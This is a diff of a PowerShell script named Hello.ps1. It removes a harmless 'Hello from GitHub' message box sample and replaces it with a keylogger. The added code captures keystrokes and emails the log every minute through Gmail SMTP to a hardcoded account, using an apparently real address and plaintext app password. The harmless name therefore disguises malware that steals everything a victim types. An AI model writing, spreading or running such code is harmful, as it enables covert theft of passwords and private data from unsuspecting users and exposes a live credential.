@@ -1,3 +1,27 @@
-# Hello.ps1 - Script mẫu cho PowerShell từ GitHub
-Add-Type -AssemblyName PresentationFramework
-[System.Windows.MessageBox]::Show("Hello from GitHub PowerShell script!", "PowerShell")
+Add-Type -AssemblyName System.Windows.Forms
+$log = ""
+
+Register-ObjectEvent -InputObject [System.Windows.Forms.Control]::FromHandle((Get-Process -Id $PID).MainWindowHandle) `
+                     -EventName KeyPress `
+                     -Action { $global:log += $eventArgs.KeyChar }
+
+$SMTPServer = "smtp.gmail.com"
+$SMTPPort = 587
+$Username = "majiinbuu82@gmail.com"
+$Password = ConvertTo-SecureString "cmie vtae uqsh rsug" -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential($Username, $Password)
+
+while ($true) {
+    Start-Sleep -Seconds 60
+    if ($log.Length -gt 0) {
+        Send-MailMessage -From $Username `
+                         -To $Username `
+                         -Subject "Keylog - $(Get-Date)" `
+                         -Body $log `
+                         -SmtpServer $SMTPServer `
+                         -Port $SMTPPort `
+                         -UseSsl `
+                         -Credential $Cred
+        $log = "" # Clear log sau mỗi lần gửi
+    }
+}
